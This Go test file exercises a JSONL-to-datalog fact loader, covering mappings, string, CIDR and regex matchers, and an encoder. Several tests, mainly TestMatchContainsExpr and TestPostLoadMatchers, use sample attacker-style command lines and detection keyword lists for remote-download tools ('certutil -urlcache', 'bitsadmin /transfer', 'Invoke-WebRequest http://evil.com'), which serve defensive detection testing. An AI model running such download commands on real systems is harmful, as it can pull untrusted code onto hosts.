package jsonfacts_test

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"testing"
	"testing/fstest"

	"swdunlop.dev/pkg/datalog"
	"swdunlop.dev/pkg/datalog/jsonfacts"
)

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func writeSchema(t *testing.T, dir string, schema any) {
	t.Helper()
	data, err := json.Marshal(schema)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "schema.json"), data, 0644); err != nil {
		t.Fatal(err)
	}
}

func TestSimpleMapping(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "people.jsonl", `{"name":"tom","age":40,"city":"NYC"}
{"name":"bob","age":30,"city":"SF"}
{"name":"ann","age":25,"city":""}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "people.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "person",
						"args":      []string{"value.name", "value.age"},
					},
					map[string]any{
						"predicate": "lives_in",
						"args":      []string{"value.name", "value.city"},
						"filter":    "value.city != ''",
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	personCount := 0
	for range db.Facts("person", 2) {
		personCount++
	}
	if personCount != 3 {
		t.Errorf("expected 3 person facts, got %d", personCount)
	}

	livesInCount := 0
	for range db.Facts("lives_in", 2) {
		livesInCount++
	}
	if livesInCount != 2 {
		t.Errorf("expected 2 lives_in facts, got %d", livesInCount)
	}
}

func TestImperativeMapping(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "emails.jsonl", `{"sender":"alice","time":"2024-01-01","recipients":["bob","carol"],"attachments":[{"name":"a.pdf","hash":"aaa","size":100},{"name":"b.txt","hash":"bbb","size":200}]}
{"sender":"dave","time":"2024-01-02","recipients":["eve"],"attachments":[{"name":"c.zip","hash":"ccc","size":300}]}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "emails.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `let id = fresh_id();
assert("email", [id, value.sender, value.time]);
map(value.recipients, assert("email_recipient", [id, #]));
map(value.attachments, assert("email_attachment", [id, #.name, #.hash, #.size]))`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	emailCount := 0
	for range db.Facts("email", 3) {
		emailCount++
	}
	if emailCount != 2 {
		t.Errorf("expected 2 email facts, got %d", emailCount)
	}

	recipientCount := 0
	for range db.Facts("email_recipient", 2) {
		recipientCount++
	}
	if recipientCount != 3 {
		t.Errorf("expected 3 email_recipient facts, got %d", recipientCount)
	}

	attachmentCount := 0
	for range db.Facts("email_attachment", 4) {
		attachmentCount++
	}
	if attachmentCount != 3 {
		t.Errorf("expected 3 email_attachment facts, got %d", attachmentCount)
	}

	// Verify ID linkage.
	for row := range db.Query("email", datalog.ID(0), datalog.Variable("S"), datalog.Variable("T")) {
		sender := row[1].(datalog.String)
		if string(sender) != "alice" {
			t.Errorf("email ID 0: expected sender alice, got %s", sender)
		}
	}
}

func TestMixedMappings(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"sender":"alice","time":"2024-01-01","tags":["urgent","review"]}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "sender",
						"args":      []string{"value.sender", "value.time"},
					},
					map[string]any{
						"expr": `let id = fresh_id(); map(value.tags, assert("tag", [id, #]))`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	senderCount := 0
	for range db.Facts("sender", 2) {
		senderCount++
	}
	if senderCount != 1 {
		t.Errorf("expected 1 sender fact, got %d", senderCount)
	}

	tagCount := 0
	for range db.Facts("tag", 2) {
		tagCount++
	}
	if tagCount != 2 {
		t.Errorf("expected 2 tag facts, got %d", tagCount)
	}
}

func TestMatchContainsExpr(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "procs.jsonl", `{"id":"alert1","cmd":"cmd.exe /c certutil -urlcache -split"}
{"id":"alert2","cmd":"notepad.exe readme.txt"}
{"id":"alert3","cmd":"powershell Invoke-WebRequest http://evil.com"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "procs.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `assert("proc", [value.id, value.cmd]);
match_contains("cmd_contains", value.id, value.cmd, [
  "certutil", "-urlcache", "Invoke-WebRequest", "wget"
])`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	procCount := 0
	for range db.Facts("proc", 2) {
		procCount++
	}
	if procCount != 3 {
		t.Errorf("expected 3 proc facts, got %d", procCount)
	}

	matchCount := 0
	for range db.Facts("cmd_contains", 2) {
		matchCount++
	}
	if matchCount != 3 {
		t.Errorf("expected 3 cmd_contains facts, got %d", matchCount)
	}
}

func TestPostLoadMatchers(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "procs.jsonl", `{"id":"a1","cmd":"certutil -urlcache"}
{"id":"a2","cmd":"notepad.exe"}
{"id":"a3","cmd":"bitsadmin /transfer"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "procs.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.id", "value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "proc",
				"term":      1,
				"contains":  []string{"certutil", "bitsadmin"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	var matchValues []string
	for row := range db.Facts("contains", 2) {
		matchCount++
		matchValues = append(matchValues, string(row[1].(datalog.String)))
	}
	slices.Sort(matchValues)
	if matchCount != 2 {
		t.Errorf("expected 2 contains facts, got %d", matchCount)
	}
	expected := []string{"bitsadmin", "certutil"}
	if !slices.Equal(matchValues, expected) {
		t.Errorf("expected patterns %v, got %v", expected, matchValues)
	}
}

func TestPostLoadMatcherCIDR(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "ips.jsonl", `{"ip":"10.0.1.5"}
{"ip":"192.168.1.1"}
{"ip":"8.8.8.8"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "ips.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "host",
						"args":      []string{"value.ip"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "host",
				"term":      0,
				"cidr":      []string{"10.0.0.0/8", "192.168.0.0/16"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for range db.Facts("cidr_match", 2) {
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 cidr_match facts, got %d", matchCount)
	}
}

func TestPostLoadMatcherRegex(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"id":"a1","cmd":"ATOMIC-T1053.005_Script.ps1"}
{"id":"a2","cmd":"notepad.exe readme.txt"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.id", "value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":   "proc",
				"term":        1,
				"regex_match": []string{`T[0-9]{4}\.[0-9]{3}`, `ATOMIC-T[0-9]{4}`},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for range db.Facts("regex_match", 2) {
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 regex_match facts, got %d", matchCount)
	}
}

func TestPatternFile(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"cmd":"certutil -urlcache"}
{"cmd":"notepad.exe"}
`)
	writeFile(t, dir, "patterns.txt", `# comment
certutil
bitsadmin
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":     "proc",
				"term":          0,
				"contains_from": "patterns.txt",
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for range db.Facts("contains", 2) {
		matchCount++
	}
	if matchCount != 1 {
		t.Errorf("expected 1 contains fact, got %d", matchCount)
	}
}

func TestMappingValidation(t *testing.T) {
	// Both expr and predicate.
	var cfg1 jsonfacts.Config
	err := json.Unmarshal([]byte(`{
		"sources": [{"file": "data.jsonl", "mappings": [
			{"predicate": "foo", "args": ["value.x"], "expr": "assert(\"foo\", [value.x])"}
		]}]
	}`), &cfg1)
	if err != nil {
		t.Fatal(err)
	}
	if err := cfg1.LoadSchemaFS(fstest.MapFS{}); err == nil {
		// validation happens inside loadSchemaFile, not on direct unmarshal.
		// Test with a schema file instead.
	}

	dir := t.TempDir()
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "foo",
						"args":      []string{"value.x"},
						"expr":      `assert("foo", [value.x])`,
					},
				},
			},
		},
	})
	var cfg2 jsonfacts.Config
	if err := cfg2.LoadSchemaDir(dir); err == nil {
		t.Error("expected error for mapping with both expr and predicate")
	}

	// Neither expr nor predicate.
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{"args": []string{"value.x"}},
				},
			},
		},
	})
	var cfg3 jsonfacts.Config
	if err := cfg3.LoadSchemaDir(dir); err == nil {
		t.Error("expected error for mapping with neither expr nor predicate")
	}
}

func TestEncoder(t *testing.T) {
	decls := []datalog.Declaration{
		{
			Name: "person",
			Terms: []datalog.TermDeclaration{
				{Name: "name"},
				{Name: "age"},
			},
		},
	}

	var buf bytes.Buffer
	enc := jsonfacts.NewEncoder(&buf, decls)

	if err := enc.Encode("person", []datalog.Constant{
		datalog.String("tom"),
		datalog.Integer(40),
	}); err != nil {
		t.Fatal(err)
	}

	if err := enc.Encode("person", []datalog.Constant{
		datalog.String("bob"),
		datalog.Integer(30),
	}); err != nil {
		t.Fatal(err)
	}

	lines := bytes.Split(bytes.TrimSpace(buf.Bytes()), []byte("\n"))
	if len(lines) != 2 {
		t.Fatalf("expected 2 lines, got %d", len(lines))
	}

	var obj map[string]map[string]any
	if err := json.Unmarshal(lines[0], &obj); err != nil {
		t.Fatal(err)
	}
	person, ok := obj["person"]
	if !ok {
		t.Fatal("expected 'person' key")
	}
	if person["name"] != "tom" {
		t.Errorf("expected name tom, got %v", person["name"])
	}
	if person["age"] != float64(40) {
		t.Errorf("expected age 40, got %v", person["age"])
	}
}

func TestEncoderNoDeclaration(t *testing.T) {
	var buf bytes.Buffer
	enc := jsonfacts.NewEncoder(&buf, nil)

	if err := enc.Encode("unknown", []datalog.Constant{
		datalog.String("val1"),
		datalog.Integer(42),
	}); err != nil {
		t.Fatal(err)
	}

	var obj map[string]map[string]any
	if err := json.Unmarshal(buf.Bytes(), &obj); err != nil {
		t.Fatal(err)
	}
	u := obj["unknown"]
	if u["0"] != "val1" {
		t.Errorf("expected key '0' = 'val1', got %v", u["0"])
	}
	if u["1"] != float64(42) {
		t.Errorf("expected key '1' = 42, got %v", u["1"])
	}
}

func TestIDType(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"x":"a"}
{"x":"b"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `let id = fresh_id(); assert("item", [id, value.x])`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	count := 0
	for row := range db.Facts("item", 2) {
		id, ok := row[0].(datalog.ID)
		if !ok {
			t.Errorf("expected first term to be ID, got %T", row[0])
		}
		if id != 0 && id != 1 {
			t.Errorf("unexpected ID %d", id)
		}
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 item facts, got %d", count)
	}
}

func TestWindashMatcher(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"cmd":"cmd.exe /transfer data"}
{"cmd":"cmd.exe -transfer data"}
{"cmd":"notepad.exe"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "proc",
				"term":      0,
				"windash":   true,
				"contains":  []string{"-transfer"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for row := range db.Facts("wd_contains", 2) {
		pat := string(row[1].(datalog.String))
		if pat != "-transfer" {
			t.Errorf("expected pattern '-transfer', got %q", pat)
		}
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 wd_contains facts, got %d", matchCount)
	}
}

func TestLoadFS(t *testing.T) {
	// Use fstest.MapFS to test the fs.FS loading path.
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "item",
						"args":      []string{"value.name", "value.value"},
					},
				},
			},
		},
		"declarations": []any{
			map[string]any{
				"name": "item",
				"terms": []any{
					map[string]any{"name": "name"},
					map[string]any{"name": "value"},
				},
			},
		},
	})

	schemaFS := fstest.MapFS{
		"schema.json": {Data: schemaJSON},
	}
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"name":"foo","value":42}
{"name":"bar","value":99}
`)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(schemaFS); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	count := 0
	for range db.Facts("item", 2) {
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 item facts, got %d", count)
	}

	// Verify declarations were loaded.
	declCount := 0
	for range db.Declarations() {
		declCount++
	}
	if declCount != 1 {
		t.Errorf("expected 1 declaration, got %d", declCount)
	}
}

func TestMultipleSchemas(t *testing.T) {
	// Simulate loading two separate schema files and merging them.
	schema1, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "alerts.jsonl",
				"mappings": []any{
					map[string]any{"predicate": "alert", "args": []string{"value.id", "value.severity"}},
				},
			},
		},
	})
	schema2, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "network.jsonl",
				"mappings": []any{
					map[string]any{"predicate": "conn", "args": []string{"value.src", "value.dst"}},
				},
			},
		},
	})

	schemaFS := fstest.MapFS{
		"alerts.json":  {Data: schema1},
		"network.json": {Data: schema2},
	}
	dataFS := fstest.MapFS{
		"alerts.jsonl":  {Data: []byte(`{"id":"a1","severity":"High"}`)},
		"network.jsonl": {Data: []byte(`{"src":"10.0.0.1","dst":"10.0.0.2"}`)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(schemaFS); err != nil {
		t.Fatal(err)
	}

	// Verify both sources were merged.
	if len(cfg.Sources) != 2 {
		t.Fatalf("expected 2 sources, got %d", len(cfg.Sources))
	}

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	alertCount := 0
	for range db.Facts("alert", 2) {
		alertCount++
	}
	connCount := 0
	for range db.Facts("conn", 2) {
		connCount++
	}
	if alertCount != 1 {
		t.Errorf("expected 1 alert, got %d", alertCount)
	}
	if connCount != 1 {
		t.Errorf("expected 1 conn, got %d", connCount)
	}
}

func TestConfigJSON(t *testing.T) {
	// Verify Config round-trips through JSON.
	var cfg jsonfacts.Config
	cfg.Sources = []jsonfacts.Source{
		{File: "data.jsonl", Mappings: []jsonfacts.Mapping{
			{Predicate: "item", Args: []string{"value.x"}},
		}},
	}
	cfg.Matchers = []jsonfacts.Matcher{
		{Predicate: "item", Term: 0, Contains: []string{"foo"}},
	}
	cfg.Declarations = []datalog.Declaration{
		{Name: "item", Terms: []datalog.TermDeclaration{{Name: "x"}}},
	}

	data, err := json.Marshal(&cfg)
	if err != nil {
		t.Fatal(err)
	}

	var cfg2 jsonfacts.Config
	if err := json.Unmarshal(data, &cfg2); err != nil {
		t.Fatal(err)
	}

	if len(cfg2.Sources) != 1 {
		t.Errorf("expected 1 source, got %d", len(cfg2.Sources))
	}
	if len(cfg2.Matchers) != 1 {
		t.Errorf("expected 1 matcher, got %d", len(cfg2.Matchers))
	}
	if len(cfg2.Declarations) != 1 {
		t.Errorf("expected 1 declaration, got %d", len(cfg2.Declarations))
	}
	if cfg2.Declarations[0].Terms[0].Name != "x" {
		t.Errorf("expected term name 'x', got %q", cfg2.Declarations[0].Terms[0].Name)
	}
}
